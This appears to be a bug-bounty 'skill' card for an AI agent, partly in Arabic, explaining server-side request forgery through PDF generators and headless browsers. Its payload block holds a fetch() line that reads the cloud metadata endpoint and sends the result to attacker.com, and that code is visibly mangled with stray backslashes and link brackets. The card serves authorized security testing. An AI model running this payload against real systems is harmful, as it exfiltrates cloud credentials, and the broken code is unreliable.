# SKILL: SSRF عبر مولّدات PDF و Headless Browsers

**Skill id:** `tip/ssrf-عبر-مولّدات-pdf-و-headless-browsers`  
**Category:** SSRF, RCE  
**Rating:** 🔥 قوية  
**Status:** Not started  
**Notion:** https://app.notion.com/p/7692511ddacf4e2d9810a1507012ac51  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **SSRF, RCE**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

فيتشرز زي (تصدير PDF / توليد invoice / screenshot لصفحة) بتشتغل غالبًا على wkhtmltopdf أو Headless Chrome/Puppeteer/Playwright، واللي بترندر HTML من إدخال المستخدم. لو حقنت وسم بيطلب مورد داخلي (cloud metadata أو [https://app.notion.com](https://app.notion.com)) السيرفر هيجيبه ويحطه في الـ PDF/الصورة = SSRF ممكن يوصل لسرقة credentials الكلاود. من أكتر مسارات SSRF المهملة.

## Payload / Code

```
\
\
\fetch('[http://169.254.169.254/latest/meta-data/').then(r=>r.text()).then(t=>location='//attacker.com/?'+btoa(t))\]()
```

## Source

YesWeHack — The Ultimate SSRF Guide

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
